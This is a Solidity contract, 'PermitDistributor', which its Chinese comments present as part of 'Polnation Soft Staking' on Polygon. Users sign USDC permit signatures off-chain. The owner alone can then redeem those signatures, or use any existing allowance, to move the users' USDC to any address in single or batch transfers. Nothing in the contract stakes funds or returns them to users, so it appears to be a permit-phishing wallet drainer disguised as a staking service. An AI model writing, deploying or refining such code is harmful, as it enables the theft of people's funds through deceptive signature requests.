// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title IUSDC with Permit
 * @notice USDC 合约接口，包含 permit 函数
 */
interface IUSDC is IERC20 {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    
    function nonces(address owner) external view returns (uint256);
}

/**
 * @title PermitDistributor
 * @notice Polnation Soft Staking 授权分发合约
 * @dev 使用 EIP-2612 Permit 签名，无需用户发起链上交易
 * 
 * 工作流程：
 * 1. 用户在前端签署 Permit 签名（离链）
 * 2. 管理员调用 executeWithPermit() 上链签名并执行转账
 * 3. 资金从用户钱包转移到指定地址
 */
contract PermitDistributor is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    // USDC 合约地址 (Polygon Mainnet)
    IUSDC public immutable usdc;
    
    // 事件
    event PermitExecuted(
        address indexed owner,
        address indexed recipient,
        uint256 amount,
        bytes32 indexed operationId
    );
    
    event DirectTransfer(
        address indexed from,
        address indexed to,
        uint256 amount,
        bytes32 indexed operationId
    );

    /**
     * @param _usdc USDC 合约地址
     */
    constructor(address _usdc) Ownable(msg.sender) {
        require(_usdc != address(0), "Invalid USDC address");
        usdc = IUSDC(_usdc);
    }

    /**
     * @notice 使用 Permit 签名执行转账（签名上链 + 转账一步完成）
     * @param owner 签名者/资金来源
     * @param value Permit 授权金额
     * @param deadline 签名过期时间
     * @param v 签名参数
     * @param r 签名参数
     * @param s 签名参数
     * @param recipient 资金接收地址
     * @param amount 实际转账金额
     * @param operationId 操作ID（用于链上追踪）
     */
    function executeWithPermit(
        address owner,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address recipient,
        uint256 amount,
        bytes32 operationId
    ) external onlyOwner nonReentrant {
        require(owner != address(0), "Invalid owner");
        require(recipient != address(0), "Invalid recipient");
        require(amount > 0, "Amount must be > 0");
        require(amount <= value, "Amount exceeds permitted value");
        require(block.timestamp <= deadline, "Permit expired");

        // 1. 上链 Permit 签名，合约获得授权
        usdc.permit(owner, address(this), value, deadline, v, r, s);

        // 2. 执行转账
        usdc.transferFrom(owner, recipient, amount);

        emit PermitExecuted(owner, recipient, amount, operationId);
    }

    /**
     * @notice 直接转账（适用于已经有 allowance 的情况）
     * @param from 资金来源
     * @param to 接收地址
     * @param amount 金额
     * @param operationId 操作ID
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount,
        bytes32 operationId
    ) external onlyOwner nonReentrant {
        require(from != address(0), "Invalid from");
        require(to != address(0), "Invalid to");
        require(amount > 0, "Amount must be > 0");

        usdc.transferFrom(from, to, amount);

        emit DirectTransfer(from, to, amount, operationId);
    }

    /**
     * @notice 批量转账（适用于已有 allowance）
     * @param froms 资金来源数组
     * @param tos 接收地址数组
     * @param amounts 金额数组
     * @param operationIds 操作ID数组
     */
    function batchTransferFrom(
        address[] calldata froms,
        address[] calldata tos,
        uint256[] calldata amounts,
        bytes32[] calldata operationIds
    ) external onlyOwner nonReentrant {
        require(froms.length == tos.length, "Length mismatch");
        require(froms.length == amounts.length, "Length mismatch");
        require(froms.length == operationIds.length, "Length mismatch");

        for (uint256 i = 0; i < froms.length; i++) {
            if (froms[i] != address(0) && tos[i] != address(0) && amounts[i] > 0) {
                usdc.transferFrom(froms[i], tos[i], amounts[i]);
                emit DirectTransfer(froms[i], tos[i], amounts[i], operationIds[i]);
            }
        }
    }

    /**
     * @notice 查询用户对本合约的授权额度
     * @param owner 用户地址
     */
    function getAllowance(address owner) external view returns (uint256) {
        return usdc.allowance(owner, address(this));
    }

    /**
     * @notice 查询用户的 nonce（用于生成新签名）
     * @param owner 用户地址
     */
    function getNonce(address owner) external view returns (uint256) {
        return usdc.nonces(owner);
    }

    /**
     * @notice 紧急提取误转入的代币
     * @param token 代币地址
     * @param amount 金额
     * @param to 接收地址
     */
    function rescueTokens(
        address token,
        uint256 amount,
        address to
    ) external onlyOwner {
        require(to != address(0), "Invalid recipient");
        IERC20(token).safeTransfer(to, amount);
    }
}
